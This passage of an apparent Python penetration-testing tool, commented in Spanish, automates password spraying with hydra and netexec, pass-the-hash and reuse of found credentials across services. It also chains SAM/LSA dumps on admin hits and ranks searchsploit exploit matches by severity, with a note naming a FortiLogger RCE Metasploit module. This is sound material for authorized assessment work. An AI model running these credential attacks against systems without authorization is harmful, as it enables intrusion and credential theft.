    # SSH que solo admite publickey Y sin ningún login sacado: se informa, no se insiste. Solo
    # si NO hubo hits — si hydra encontró una credencial válida pese a errores sueltos de 'no
    # password auth' (cuentas publickey mezcladas en la lista), esa credencial SÍ vale.
    if np == "ssh" and not hits and ("method reply" in out or "does not support password auth" in out):
        _step(res, shown, False, safe_out, note=f"spray en bloque por SSH (hydra, {n} combinaciones)")
        res["findings"].append(("info",
            "SSH: el servidor NO admite autenticación por contraseña (solo publickey) → el brute por SSH "
            "no aplica aquí; si consigues una clave privada, úsala con 'ssh -i'"))
        return []
    _step(res, shown, bool(hits), safe_out, note=f"spray en bloque por {np.upper()} (hydra, {n} combinaciones)")
    # hydra cortado por el servidor («too many connection errors»): el resultado puede ser
    # incompleto — avisar para no leer un 0-hits como «no hay credenciales» (falso negativo).
    if conn_errors:
        if hits:
            res["findings"].append(("info",
                f"{np.upper()}: hydra se cortó por errores de conexión del servidor tras encontrar "
                "credenciales — puede quedar alguna sin probar; reintenta con menos hilos si falta algo."))
        else:
            res["findings"].append(("media",
                f"{np.upper()}: hydra NO pudo completar el brute — el servidor cortó las conexiones o no "
                "respondió (p. ej. «too many connection errors» / «No route to host»); el 0 resultados NO "
                "significa «sin credenciales». Reintenta (más suave, -t 1) cuando el objetivo responda: "
                f"hydra -L <users> -P <pass> -t 1 -I {tgt}"))
    # SMB: confirmar cada acierto con nxc (ground truth + saber si es admin para el volcado)
    if np == "smb" and hits:
        confirmed = []
        for h in hits:
            ok, pwn3d = _nxc_confirm_smb(nxc, ip, h["user"], h["password"], port, dp, local_auth)
            if ok:
                h["pwn3d"] = pwn3d
                confirmed.append(h)
        hits = confirmed
    return hits


# ── Retroalimentación: cada credencial descubierta se reprueba en TODOS los servicios ──────
# «No dejar cabos sueltos»: un login válido hallado en un servicio (o una credencial en claro /
# hash NTLM volcado de SAM/LSA) se reprueba contra el resto de servicios; si abre uno nuevo
# smb/ldap se enumera con ella, lo que puede destapar MÁS credenciales → vuelven al pool. Acotado:
# 1 intento por (cred, protocolo) —nunca un spray, sin riesgo de bloqueo más allá de 1/cuenta/
# protocolo—, deduplicado por `tried`, con tope de rondas y de credenciales.
_REUSE_MAX_ROUNDS = 3
_REUSE_MAX_CREDS = 20


def _pool_add(pool, user, secret, is_hash):
    """Añade (user, secret, is_hash) al pool de reutilización si no estaba ya. `secret` es una
    contraseña (is_hash=False) o un hash NTLM (is_hash=True, pass-the-hash)."""
    if not user:
        return
    secret = secret or ""
    if any(c["user"] == user and c["secret"] == secret and c["is_hash"] == bool(is_hash) for c in pool):
        return
    pool.append({"user": user, "secret": secret, "is_hash": bool(is_hash)})


def _nxc_try_cred(nxc, np, ip, user, secret, is_hash, local_auth, port, dp):
    """Un ÚNICO intento de una credencial por un protocolo nxc (reutilización entre servicios).
    Contraseña por fichero 0600 (nunca en el argv); hash por -H. Devuelve (ok, pwn3d,
    salida_enmascarada, comando_mostrado)."""
    import tempfile
    sec_file = None
    if secret and not is_hash:
        sec_file = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
        sec_file.write(secret + "\n")
        sec_file.close()
        os.chmod(sec_file.name, 0o600)
    try:
        auth = ["-H", secret] if is_hash else ["-p", sec_file.name if sec_file else ""]
        cmd = [nxc, np, ip, "-u", user] + auth
        if local_auth and np in _NXC_LOCAL_AUTH_PROTOS:
            cmd.append("--local-auth")
        if port and dp and port != dp:
            cmd += ["--port", str(port)]
        rc, out = run_capture(cmd, timeout=40, quiet=True)
    finally:
        if sec_file:
            try:
                os.unlink(sec_file.name)
            except OSError:
                pass
    out = out or ""
    shown_sec = ("-H " if is_hash else "-p ") + ("''" if not secret else "'***'")
    shown = f"{nxc} {np} {ip} -u {shlex.quote(user)} {shown_sec}"
    if local_auth and np in _NXC_LOCAL_AUTH_PROTOS:
        shown += " --local-auth"
    if port and dp and port != dp:
        shown += f" --port {port}"
    safe_out = out.replace(secret, "***") if secret else out
    return _nxc_ok(out), bool(re.search(r"\(Pwn3d!\)", out)), safe_out, shown


def _reuse_chain(ip, buckets, proto_meta, res_by_proto, cred_pool, tried, enriched,
                 nxc, local_auth, is_dc, base, ad_seen, domain):
    """Reprueba cada credencial del pool contra todos los servicios detectados y, si abre uno
    smb/ldap nuevo, lo enumera (lo que puede volcar MÁS credenciales → nuevas rondas). Escribe
    cada paso/hallazgo en el footprint-dict del protocolo correspondiente (res_by_proto). Ver la
    cabecera de esta sección para los límites (1 intento/cred/proto, rondas y nº de creds)."""
    if not cred_pool:
        return
    if len(cred_pool) > _REUSE_MAX_CREDS:
        info(f"[retroalimentación] {len(cred_pool)} credenciales en el pool; reutilizo las primeras "
             f"{_REUSE_MAX_CREDS} (el resto quedan como hallazgo para probar a mano).")
    for _round in range(_REUSE_MAX_ROUNDS):
        progressed = False
        for cred in list(cred_pool)[:_REUSE_MAX_CREDS]:   # snapshot: el pool puede crecer dentro
            u, secret, ch = cred["user"], cred["secret"], cred["is_hash"]
            for np in buckets:
                key = (u, secret, ch, np)
                if key in tried:
                    continue
                tried.add(key)
                port, dp = proto_meta[np]
                ok, pwn, safe_out, shown = _nxc_try_cred(nxc, np, ip, u, secret, ch, local_auth, port, dp)
                res = res_by_proto[np]
                cred_disp = f"{u}:{secret}" if secret else f"{u}:∅"   # botín descubierto → en claro
                _step(res, shown, ok or pwn, safe_out,
                      note=f"RETROALIMENTACIÓN: credencial de «{u}» descubierta en otro servicio, reprobada por {np.upper()} (1 intento)")
                if not (ok or pwn):
                    continue
                progressed = True
                if pwn:
                    _psev, _pcl = _pwn_clause(np)
                    res["findings"].append((_psev, f"{np.upper()}: credencial reutilizada {_pcl} — «{cred_disp}»"))
                    if np == "smb":
                        _dump_sam_lsa(res, nxc, ip, u, secret, port, dp, local_auth=local_auth, is_hash=ch, pool=cred_pool)
                else:
                    res["findings"].append(("alta", f"{np.upper()}: credencial reutilizada VÁLIDA — «{cred_disp}»"))
                if np in ("smb", "ldap") and np not in enriched:
                    enriched.add(np)
                    _creds_enum(res, nxc, np, ip, u, secret, ch, local_auth, is_dc, port, dp, base, ad_seen, domain)
        if not progressed:
            break


def provided_creds_check(ip, services, creds, bulk=None, local_auth=False, is_hash=False, base=None, domain=None):
    """Fase 5d: prueba las credenciales aportadas contra cada servicio detectado con nxc
    (reutilización entre protocolos). Devuelve UN footprint-dict POR PROTOCOLO REAL usado
    (proto="reuse-smb"/"reuse-ldap"/…, no un único bloque "reuse" mezclando todos como antes)
    para que el informe pueda agrupar las 3 fases de un mismo protocolo (footprint anónimo +
    credenciales por defecto + aportadas) bajo un solo desplegable. La contraseña NUNCA se
    escribe en el informe (se enmascara) NI va
    en el argv del subproceso (nxc soporta -p <fichero>: se escribe a un temporal 0600 y
    se borra al terminar — a diferencia de DEFAULT_CREDS, aquí es una contraseña REAL del
    operador y `ps aux`/`/proc/<pid>/cmdline` la expondría mientras nxc corre).

    `is_hash` (--hash/-H, pass-the-hash) cambia -p por -H: nxc no admite ahí el truco de
    fichero (va literal en el argv mientras nxc corre — inevitable, es el propio interfaz
    de nxc), pero SÍ se enmascara igual que la contraseña en lo que queda guardado
    (informe/commands.log): un hash NTLM es tan reutilizable como la contraseña en claro
    (pass-the-hash no necesita crackeo), así que el informe no debe conservarlo en claro.

    `domain`: dominio AD ya resuelto (discover_domains, calculado pronto por run_one para
    esto — ver main()) o None si aún no se conoce. Solo lo usa la rama LDAP de _creds_enum,
    para 'certipy find -u user@dominio' (AD CS). Sin él, certipy igualmente puesto se deja
    como sugerencia manual con el placeholder "DOMINIO" en vez de ejecutarse a ciegas.

    `local_auth` (--local-auth de palantir) añade --local-auth a nxc en los protocolos de
    `_NXC_LOCAL_AUTH_PROTOS`: hace falta cuando el objetivo SÍ está unido a un dominio pero
    la credencial que pruebas es una cuenta LOCAL de esa máquina (sin la flag, nxc intenta
    validarla contra el dominio y falla aunque la cuenta sea válida en local — en un
    Windows SUELTO, sin dominio, no hace falta: ya se confirmó contra una máquina sin DC).

    `bulk`, si no es None, es (users, passwords, no_bruteforce) de --user-list/-U +
    --pass-list/-P en modo spray (demasiadas combinaciones para un proceso nxc por par:
    cada arranque de nxc, aparte del intento en sí, paga su propio boot de Python — con
    miles de pares eso domina sobre el tiempo real de red). En vez de expandir a pares y
    llamar a nxc una vez por cada uno, se escriben las DOS listas a fichero y se llama a
    nxc UNA vez por protocolo con -u fichero -p fichero (+ --no-bruteforce de nxc si
    palantir lo pidió, + --continue-on-success — sin esto nxc PARA en el primer login
    válido y nunca prueba el resto) — nxc ya sabe iterar listas de fichero por dentro,
    sin el coste de un proceso nuevo por combinación. `creds` (pares explícitos de
    --creds-file, que NUNCA se cruzan) se siguen probando 1 a 1 como siempre, aparte;
    el llamante (run_one) ya quita de `creds` los pares que `bulk` cubre, para no
    probarlos dos veces."""
    import tempfile
    if not creds and not bulk:
        return []
    buckets = {}
    for p in services:
        c = classify(p)
        # mysql/postgres NO son protocolos de nxc (sin módulo para ellos, a diferencia de
        # mssql) — se añaden aquí aparte para que SÍ entren en la Fase 5d, pero el bucle de
        # abajo los desvía a _db_cred_test (cliente CLI real) en vez del camino basado en nxc.
        np = _NXC_PROTO_OF.get(c) or (c if c in ("mysql", "postgres") else None)
        if np:
            buckets.setdefault(np, []).append(p)
    if not buckets:
        res = _fp("reuse", "Credenciales aportadas (reutilización)", sorted({p["port"] for p in services}))
        res["findings"].append(("info", "ningún servicio compatible para probar las credenciales aportadas"))
        return [res]
    # nxc solo hace falta para los protocolos que lo usan (todos salvo mysql/postgres, que van
    # por el cliente CLI real — ver _db_cred_test); si el objetivo solo tiene una BD, no hay que
    # abortar la fase ENTERA por no tener nxc instalado.
    _DB_ONLY_PROTOS = {"mysql", "postgres"}
    nxc = nxc_bin()
    if not nxc:
        _non_db = sorted(set(buckets) - _DB_ONLY_PROTOS)
        if _non_db:
            warn(f"credenciales aportadas: nxc/netexec no está instalado, no puedo probarlas en {', '.join(_non_db)}."
                 + (" Sigo con mysql/postgres (no usan nxc)." if set(buckets) & _DB_ONLY_PROTOS else ""))
        if not (set(buckets) & _DB_ONLY_PROTOS):
            return []
        buckets = {k: v for k, v in buckets.items() if k in _DB_ONLY_PROTOS}
    phase("Fase 5d — credenciales aportadas (reutilización entre servicios)",
          "una credencial válida en un servicio suele valer en otros: se prueba cada par aportado contra cada servicio detectado (1 intento por par y protocolo, no es fuerza bruta)")
    is_dc = is_domain_controller(services)
    enriched = set()   # protocolos (smb/ldap) ya enumerados con credencial válida (1 vez basta)
    ad_seen = set()    # markers de _surface_ad_enum ya añadidos — compartido entre SMB y LDAP
                       # (que ahora tienen cada uno su propio footprint-dict) para no duplicar
                       # el mismo hallazgo de AD (usuarios del dominio, lockout) en los dos
    cred_pool = []     # credenciales descubiertas (login válido o volcadas de SAM/LSA) → retroalimentación
    tried = set()      # (user, secret, is_hash, proto) ya intentados — no repetir en la cadena de reutilización
    res_by_proto = {}  # proto → su footprint-dict (para que _reuse_chain escriba en el sitio correcto)
    proto_meta = {}    # proto → (port, dp)
    if bulk:
        bulk_users, bulk_passwords, no_bf = bulk
        n_bulk = len(bulk_users) if no_bf else len(bulk_users) * len(bulk_passwords)
        info(f"Fase 5d en modo spray: {n_bulk} combinaciones por protocolo. SSH/FTP/SMB van con "
             "hydra (más rápido y fiable que nxc por esos protocolos); el resto —y pass-the-hash— con "
             "nxc en bloque. No se imprime cada intento aquí: el progreso queda en commands.log.")
    # Un footprint-dict POR PROTOCOLO REAL (no uno mezclando smb+ldap+wmi+rdp como antes:
    # "reuse" era el único bloque que no se podía agrupar por protocolo en el informe junto
    # al footprint anónimo y las credenciales por defecto de ESE MISMO protocolo — justo lo
    # que pedía poder compactar). proto="reuse-smb"/"reuse-ldap"/… — el renderer le quita el
    # prefijo "reuse-" (y "creds-") para agrupar las 3 fases de un protocolo bajo un mismo
    # desplegable (ver build_html/build_markdown).
    results = []
    for np in sorted(buckets, key=lambda p: _CREDS_PROTO_PRIORITY.index(p) if p in _CREDS_PROTO_PRIORITY else len(_CREDS_PROTO_PRIORITY)):
        ports = buckets[np]
        res = _fp("reuse-" + np, f"Credenciales aportadas — {np.upper()}", sorted({p["port"] for p in ports}))
        results.append(res)
        port = ports[0]["port"]
        # mysql/postgres: SOLO LECTURA vía el cliente CLI real (_db_cred_test), no por nxc (no
        # tiene módulo para ellos). Solo pares explícitos (--user/--pass/--creds-file) — el
        # modo spray (-U/-P) de más abajo es específico de nxc/hydra, no se soporta aquí todavía
        # (si hace falta, pedir luz verde para añadirlo en vez de mezclarlo en el mismo bucle).
        if np in ("mysql", "postgres"):
            if is_hash:
                res["findings"].append(("info", f"{np.upper()}: --hash/-H (pass-the-hash) no aplica a la autenticación de BD — dame --user/--pass o --creds-file."))
            elif not creds:
                msg = f"{np.upper()}: dame --user/--pass o --creds-file para probar la credencial aportada (no usa nxc)."
                if bulk:
                    msg += " El spray de listas (-U/-P) todavía no está soportado para esta BD."
                res["findings"].append(("info", msg))
            else:
                for u, p in creds:
                    ok, shown, out = _db_cred_test(np, ip, port, u, p)
                    if ok is None:
                        res["missing"].append("mysql" if np == "mysql" else "psql")
                        continue
                    masked = f"{u}:{'∅' if p == '' else '***'}"
                    safe_out = (out or "").replace(p, "***") if p else out
                    _step(res, shown, ok, safe_out,
                          note=f"probar la credencial aportada «{masked}» por {np.upper()} (1 intento, confirmado con SELECT 1)")
                    if ok:
                        res["findings"].append(("alta", f"{np.upper()}: credencial aportada válida — «{masked}»"))
                        _db_enum(res, np, ip, port, u, p, base)
            continue
        dp = _NXC_DEFAULT_PORT.get(np)
        res_by_proto[np] = res
        proto_meta[np] = (port, dp)
        if np == "rdp":
            warn("RDP: probando credenciales aportadas — OJO al bloqueo de cuentas (lockout); un (Pwn3d!) confirma login, no privilegios.")
        if bulk:
            bulk_users, bulk_passwords, no_bf = bulk
            # Fuerza bruta de LISTAS: hydra en ssh/ftp/smb (más rápido y sin el bug de paramiko
            # de nxc por SSH); nxc para el resto, para pass-the-hash (hydra no lo hace) o si
            # hydra no está instalado. La enumeración CON la credencial ganadora
            # (--shares/--sam/--users/roasting, más abajo) sigue siendo de nxc.
            if np in _HYDRA_SPRAY_PROTOS and not is_hash and hydra_bin():
                hits = _hydra_bulk(res, np, ip, port, dp, bulk_users, bulk_passwords, no_bf, nxc, local_auth)
            else:
                hits = _nxc_bulk(res, np, ip, port, dp, bulk_users, bulk_passwords, no_bf, nxc, is_hash, local_auth)
            for hit in hits:
                # La credencial GANADORA del spray es botín DESCUBIERTO (no es tu input) → se muestra en
                # CLARO, igual que los hashes de SAM/LSA: así sabes CUÁL de la lista acertó sin re-lanzar nada.
                label = (f"{hit['user']}:{hit['password']}" if hit["user"] and hit["password"]
                         else (hit["user"] or "usuario sin identificar (ver salida cruda)"))
                if hit["user"] and hit["password"]:   # alimenta la retroalimentación con la credencial ganadora
                    tried.add((hit["user"], hit["password"], is_hash, np))
                    _pool_add(cred_pool, hit["user"], hit["password"], is_hash)
                if hit["pwn3d"]:
                    _psev, _pcl = _pwn_clause(np)
                    res["findings"].append((_psev, f"{np.upper()}: credencial del spray {_pcl} — «{label}»"))
                    if np == "smb":
                        if hit["user"] and hit["password"]:
                            _dump_sam_lsa(res, nxc, ip, hit["user"], hit["password"], port, dp, local_auth=local_auth, is_hash=is_hash, pool=cred_pool)
                        else:
                            res["findings"].append(("info",
                                "SMB: Pwn3d! en el spray pero no se pudo extraer la credencial exacta de la línea "
                                "cruda de nxc para encadenar el volcado SAM/LSA automático — hazlo a mano: "
                                f"nxc smb {ip} -u <user> -p <pass> --sam / --lsa"))
                else:
                    res["findings"].append(("alta", f"{np.upper()}: credencial del spray válida — «{label}»"))
                # Credencial VÁLIDA del spray → misma enumeración CON ella que en el modo 1-a-1
                # (--shares/--users/--pass-pol/--rid-brute por SMB, roasting por LDAP…). Antes
                # esto solo pasaba con --user/--pass o --creds-file: el caso más común de
                # conseguir una credencial de dominio (un spray que pega) se quedaba sin la
                # enumeración nueva. 1 vez por protocolo (enriched compartido con el bucle de abajo).
                if np in ("smb", "ldap") and np not in enriched and hit["user"] and hit["password"]:
                    enriched.add(np)
                    _creds_enum(res, nxc, np, ip, hit["user"], hit["password"], is_hash, local_auth, is_dc, port, dp, base, ad_seen, domain)
                elif np == "mssql" and np not in enriched and hit["user"] and hit["password"]:
                    # mysql/postgres no llegan aquí (mysql/postgres hacen 'continue' antes de este
                    # bucle de bulk — no son protocolos de nxc, ver _db_cred_test más arriba).
                    enriched.add(np)   # BD: lista bases/tablas no de sistema + impersonación/linked/sysadmin
                    _db_enum(res, np, ip, port, hit["user"], hit["password"], base, is_hash=is_hash)
        for u, p in creds:
            sec_file = None
            if p and not is_hash:
                sec_file = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
                sec_file.write(p + "\n")
                sec_file.close()
                os.chmod(sec_file.name, 0o600)
            auth = ["-H", p] if is_hash else ["-p", sec_file.name if sec_file else ""]
            cmd = [nxc, np, ip, "-u", u] + auth
            if local_auth and np in _NXC_LOCAL_AUTH_PROTOS:
                cmd.append("--local-auth")
            if port and dp and port != dp:
                cmd += ["--port", str(port)]
            try:
                rc, out = run_capture(cmd, timeout=40)
            finally:
                if sec_file:
                    try:
                        os.unlink(sec_file.name)
                    except OSError:
                        pass
            # La CONTRASEÑA aportada se MUESTRA (es del propio operador y el sentido de esta fase es
            # ver CUÁL de las probadas funciona; enmascararla la dejaba inservible). El HASH (PtH) sí
            # se enmascara: un NTLM es tan reutilizable como la contraseña y no aporta verlo escrito.
            masked = f"{u}:{'∅' if p == '' else ('***' if is_hash else p)}"
            shown_sec = ("-H " + ("''" if not p else "'***'")) if is_hash else \
                        ("-p " + ("''" if p == "" else shlex.quote(p)))
            shown = f"{nxc} {np} {ip} -u {shlex.quote(u)} {shown_sec}"
            if local_auth and np in _NXC_LOCAL_AUTH_PROTOS:
                shown += " --local-auth"
            if port and dp and port != dp:
                shown += f" --port {port}"
            safe_out = out.replace(p, "***") if (p and is_hash) else out
            ok = _nxc_ok(out)
            _step(res, shown, ok, safe_out,
                  note=f"probar la credencial aportada «{masked}» por {np.upper()} ({'pass-the-hash' if is_hash else 'reutilización'}, 1 intento)")
            pwn = bool(re.search(r"\(Pwn3d!\)", out))
            tried.add((u, p, is_hash, np))
            if ok or pwn:   # credencial válida → al pool de retroalimentación
                _pool_add(cred_pool, u, p, is_hash)
            if pwn:
                _psev, _pcl = _pwn_clause(np)
                res["findings"].append((_psev, f"{np.upper()}: credencial aportada «{masked}» {_pcl}"))
                if np == "smb":
                    _dump_sam_lsa(res, nxc, ip, u, p, port, dp, local_auth=local_auth, is_hash=is_hash, pool=cred_pool)
            elif ok:
                res["findings"].append(("alta", f"{np.upper()}: credencial aportada válida — «{masked}»"))
            # Credencial VÁLIDA → enumeración de SOLO LECTURA CON ella (shares/usuarios/grupos/
            # roasting), que es justo lo que el operador espera de -u/-p/-H. 1 vez por protocolo.
            if (ok or pwn) and np in ("smb", "ldap") and np not in enriched:
                enriched.add(np)
                _creds_enum(res, nxc, np, ip, u, p, is_hash, local_auth, is_dc, port, dp, base, ad_seen, domain)
            elif (ok or pwn) and np == "mssql" and np not in enriched:   # mysql/postgres: ver _db_cred_test arriba
                enriched.add(np)   # BD: lista bases/tablas no de sistema (+ impersonación/linked/sysadmin en MSSQL)
                _db_enum(res, np, ip, port, u, p, base, is_hash=is_hash)
    # RETROALIMENTACIÓN: reprueba todo lo descubierto (logins válidos + creds/hashes volcados) contra
    # el resto de servicios y enumera lo que abra — puede destapar más credenciales en cadena.
    _reuse_chain(ip, buckets, proto_meta, res_by_proto, cred_pool, tried, enriched,
                 nxc, local_auth, is_dc, base, ad_seen, domain)
    return results


# ═══════════════ Búsqueda de exploits conocidos (searchsploit, Fase 5b) ═══════════════
# Consulta OFFLINE contra la base local de exploit-db (searchsploit): no descarga
# ni ejecuta nada, solo busca por el product+version que nmap ya detectó. El match
# es por tokens (AND) y es ruidoso por naturaleza → los hits se marcan como
# "verificar a mano" (severidad media, no alta).

# Mega-vendedores cuyo nombre A SECAS casa con miles de exploits sin relación en
# exploit-db (p. ej. "Microsoft" → 2000+ hits de Office/Edge/.NET): nunca se usan
# como término corto; para estos solo vale el nombre completo del producto.
GENERIC_VENDORS = {"microsoft", "oracle", "ibm", "cisco", "google", "adobe",
                   "vmware", "apple", "hp", "dell", "sap", "symantec", "mcafee",
                   "sun", "novell", "citrix", "redhat", "canonical", "suse", "intel",
                   # Suites multi-producto: su 1ª palabra sola matchea toda la familia en
                   # searchsploit (p. ej. "Apache httpd 2.4.41" → "Apache 2.4.41" cuela
                   # Tomcat/mod_ssl/CXF/Xerces, nada que ver). Mantener el nombre completo.
                   "apache", "php", "eclipse", "mozilla",
                   # "Cloudflare http proxy" (lo que nmap -sV adivina tras su WAF) reducido a
                   # solo "Cloudflare" colaba el EDB-50805 de Cloudflare WARP (cliente de
                   # escritorio Windows, nada que ver con el proxy/CDN) — visto en vivo contra
                   # HostGator LATAM.
                   "cloudflare"}


def _ss_terms(product, version):
    """Términos de búsqueda a partir de product+version de nmap, del más
    específico al más laxo (nombre completo/1ª palabra × versión completa/mayor.menor).
    La 1ª palabra solo se usa como término corto si NO es un mega-vendor genérico."""
    prod = re.sub(r"\s+", " ", product or "").strip()
    if not prod:
        return []
    first = prod.split()[0]
    if prod == first or first.lower() in GENERIC_VENDORS:
        prods = [prod]                       # una sola palabra, o 1ª palabra = vendor genérico
    else:
        prods = [prod, first]
    vers = []
    ver = (version or "").strip()
    if ver:
        vers.append(ver)
        m = re.match(r"(\d+\.\d+)", ver)
        if m and m.group(1) != ver:
            vers.append(m.group(1))
    attempts = [f"{pr} {v}" for v in vers for pr in prods] if vers else list(prods)
    return list(dict.fromkeys(attempts))


# Criticidad ESTIMADA de un exploit a partir de su tipo (remote/local/webapps/dos)
# y de palabras clave del título. NO es un CVSS oficial — exploit-db no da score;
# es una heurística para priorizar qué mirar primero. Siempre verificar a mano.
EXPLOIT_SEV_ORDER = {"critica": 0, "alta": 1, "media": 2, "baja": 3}


def _exploit_severity(title, typ=""):
    t = (title or "").lower()
    ty = (typ or "").lower()
    def has(*ws): return any(w in t for w in ws)
    if ty == "dos" or has("denial of service", "(dos)", " dos ", "crash"):
        return "baja"
    if has("remote code execution", "rce", "code execution", "command execution",
           "command injection", "backdoor", "unauthenticated", "deserialization",
           "pre-auth", "preauth", "arbitrary code"):
        return "critica"                           # ejecución de código, sobre todo sin auth
    if has("authentication bypass", "auth bypass", "sql injection", "sqli",
           "arbitrary file upload", "file upload", "privilege escalation", "privesc",
           "arbitrary file write", "arbitrary file read", "directory traversal",
           "path traversal", "buffer overflow", "overflow", "xxe", "ssrf"):
        return "alta"
    if ty in ("remote", "local"):
        return "alta"                              # exploit real remoto/local sin keyword clara
    if has("cross-site scripting", "xss", "csrf", "information disclosure",
           "disclosure", "local file inclusion", "lfi", "memory corruption"):
        return "media"
    return "media"


def _ss_parse(out):
    """Parsea el JSON de `searchsploit -j` → lista de {title, edb, path, platform, type, sev}.
    Dedupe por EDB-ID (título si no hay EDB-ID, p. ej. 'Codes' vacío): confirmado en un run
    real que `searchsploit -j` puede devolver el MISMO exploit dos veces dentro de
    RESULTS_EXPLOIT para un término genérico (visto con 'Microsoft Windows RPC' y
    '.NET' — varios EDB-ID repetidos) — sin dedupe, se cuela dos veces en la lista
    Y en el conteo "N exploits en exploit-db" (hallazgos/quick-wins/HTML), que lo usa
    directamente con len(). Se mantiene el ORDEN (1ª aparición gana)."""
    if not out:
        return []
    try:
        data = json.loads(out)
    except json.JSONDecodeError:
        i = out.find("{")                          # searchsploit a veces antepone avisos
        if i < 0:
            return []
        try:
            data = json.loads(out[i:])
        except json.JSONDecodeError:
            return []
    res, seen = [], set()
    for e in data.get("RESULTS_EXPLOIT", []):
        title, typ = e.get("Title", ""), e.get("Type", "")
        edb = e.get("EDB-ID") or e.get("Codes") or ""
        key = edb or title
        if key in seen:
            continue
        seen.add(key)
        res.append({"title": title, "edb": edb,
                    "path": e.get("Path", ""),
                    "platform": e.get("Platform", ""),
                    "type": typ,
                    "sev": _exploit_severity(title, typ)})
    return res


def searchsploit_one(term):
    rc, out = run_capture(["searchsploit", "-j", term], timeout=30)
    return _ss_parse(out)


# ─── Productos web identificables solo por su título/cabecera (no por el banner
# genérico de nmap -sV) con un RCE pre-auth conocido. Lista deliberadamente corta
# y curada a mano: solo entra algo aquí tras toparse con el caso real (nmap -sV
# dio un banner inútil tipo "Microsoft HTTPAPI httpd 2.0" y el título de la
# página sí delataba el producto). Ir ampliándola cuando se tope con otro caso así.
KNOWN_VULN_WEB_PRODUCTS = [
    # (regex sobre http-title/http-server-header, término para searchsploit, nota)
    (re.compile(r"fortilogger", re.I), "FortiLogger",
     "CVE-2021-3378 (CVSS 9.8): subida de fichero arbitraria SIN autenticación → RCE. "
     "Vulnerable <5.2.0. Módulo MSF: exploit/windows/http/fortilogger_arbitrary_fileupload"),
]


def _known_web_product(services):
    """Busca en el http-title / http-server-header de CUALQUIER puerto (ya
    capturados por nmap) un producto de KNOWN_VULN_WEB_PRODUCTS. nmap -sV a veces
    solo da el banner genérico del framework (p.ej. "Microsoft HTTPAPI httpd 2.0")
    y el producto real que corre detrás solo se ve en el título de la página — eso
    nunca entra en el matching normal de vuln_search() porque no es product/version
    de nmap. OJO: a propósito NO se filtra con is_web() — is_web() descarta los
    puertos "httpapi" para no perder tiempo fuzzeándolos (HTTP.sys crudo, devuelve
    404 a todo), pero es EXACTAMENTE donde nmap suele dejar un producto real detrás
    de un banner genérico (visto en vivo: FortiLogger en :5000 reportado como
    "Microsoft HTTPAPI httpd 2.0"). Devuelve (puerto, nombre, nota) de la 1ª
    coincidencia, o None."""
    for p in services:
        scripts = p.get("scripts") or {}
        txt = scripts.get("http-title", "") + " " + scripts.get("http-server-header", "")
        if not txt.strip():
            continue
        for rx, name, note in KNOWN_VULN_WEB_PRODUCTS:
            if rx.search(txt):
                return p["port"], name, note
    return None


# Build de kernel de Windows (NO la "versión marketing") a partir del cual se
# considera el SO "moderno": Windows 10 / Server 2016 es build 10240. Por debajo
# (7/8/8.1/Vista/2008/2003/XP/2000/NT4) un exploit de esa era sí puede aplicar.
WIN_MODERN_BUILD = 10240

# Exploits de exploit-db cuyo TÍTULO menciona explícitamente un SO anterior a
# Windows 10/Server 2016 (XP/2000/NT4/2003/Vista/7/8/8.1, o un boletín MS03..MS15,
# todos de 2003-2015). Si el host detectado es "moderno" esto es casi siempre
# ruido del matching genérico por banner (p.ej. "Microsoft Windows RPC" casa con
# exploits DCOM de 2003) y se BAJA de severidad en vez de descartarse del todo:
# se queda visible para quien quiera verificarlo, solo deja de ensuciar lo
# "accionable" (alta/crítica).
_OLD_OS_TITLE_RX = re.compile(
    r"windows\s*(nt\s*4|2000|xp|2003|vista|7\b|8(\.1)?\b)"
    r"|\bms0[3-9]-\d{3}\b|\bms1[0-5]-\d{3}\b",
    re.I)


def _detect_win_build(services):
    """Saca el build de kernel de Windows de rdp-ntlm-info (Product_Version,
    inequívoco) o si no de smb-os-discovery (el número de 4-5 cifras más alto del
    texto: el build siempre es mayor que cualquier año de marketing tipo "2019"
    que aparezca en el nombre del producto). None si no hay info suficiente."""
    for p in services:
        txt = (p.get("scripts") or {}).get("rdp-ntlm-info", "")
        m = re.search(r"Product_Version:\s*\d+\.\d+\.(\d+)", txt)
        if m:
            return int(m.group(1))
    for p in services:
        txt = (p.get("scripts") or {}).get("smb-os-discovery", "")
        if "windows" in txt.lower():
            nums = [int(n) for n in re.findall(r"\b(\d{4,5})\b", txt)]
            if nums:
                return max(nums)
    return None


def vuln_search(services):
    """Por cada versión detectada (product+version), busca en searchsploit.
    Devuelve None si no está instalado, o una lista (una fila por versión única,
    con los puertos que la comparten y sus exploits).

    Dos pasadas extra sobre el matching genérico por product+version de nmap:
    - _known_web_product(): productos identificados por el título de la web, no
      por el banner (ver KNOWN_VULN_WEB_PRODUCTS) → fila con known=True.
    - _detect_win_build(): si el host es Windows 10/Server 2016+ confirmado, los
      exploits cuyo título es claramente de un SO anterior bajan a severidad
      "baja" (ver _OLD_OS_TITLE_RX)."""
    if not have("searchsploit"):
        return None
    phase("Fase 5b — búsqueda de exploits conocidos (searchsploit, offline)",
          "cruza cada producto+versión detectado con la base local de exploit-db; es un punto de partida, hay falsos positivos")
    uniq = {}
    for p in services:
        prod = (p["product"] or "").strip()
        if prod:
            uniq.setdefault((prod, (p["version"] or "").strip()), []).append(p)
    out, cache = [], {}
    for (prod, ver), ps in uniq.items():
        hits, term_used = [], ""
        for term in _ss_terms(prod, ver):
            term_used = term
            if term not in cache:
                cache[term] = searchsploit_one(term)
            hits = cache[term]
            if hits:
                break
        # set(): el mismo product+version puede repetirse en el mismo número de puerto
        # por tcp Y por udp (visto en un run real: 'Simple DNS Plus' en 53/tcp y 53/udp
        # → sin el set(), el puerto "53" salía dos veces en la etiqueta "(53,53)").
        out.append({"ports": sorted({p["port"] for p in ps}),
                    "service": ps[0]["name"] or "?", "product": prod, "version": ver,
                    "term": term_used, "exploits": hits, "known": False, "known_note": ""})

    kw = _known_web_product(services)
    if kw:
        port, name, note = kw
        if name not in cache:
            cache[name] = searchsploit_one(name)
        out.append({"ports": [port], "service": "http", "product": name, "version": "",
                    "term": name, "exploits": cache[name], "known": True, "known_note": note})

    build = _detect_win_build(services)
    if build is not None and build >= WIN_MODERN_BUILD:
        for v in out:
            for e in v["exploits"]:
                if e["sev"] != "baja" and _OLD_OS_TITLE_RX.search(e["title"]):
                    e["sev"] = "baja"
                    e["title"] += f"  [SO objetivo moderno, build {build} — probablemente no aplica]"
    return out


def _real_user_ids():
    """(uid, gid) del usuario real bajo sudo, o None si no corremos con sudo (o la
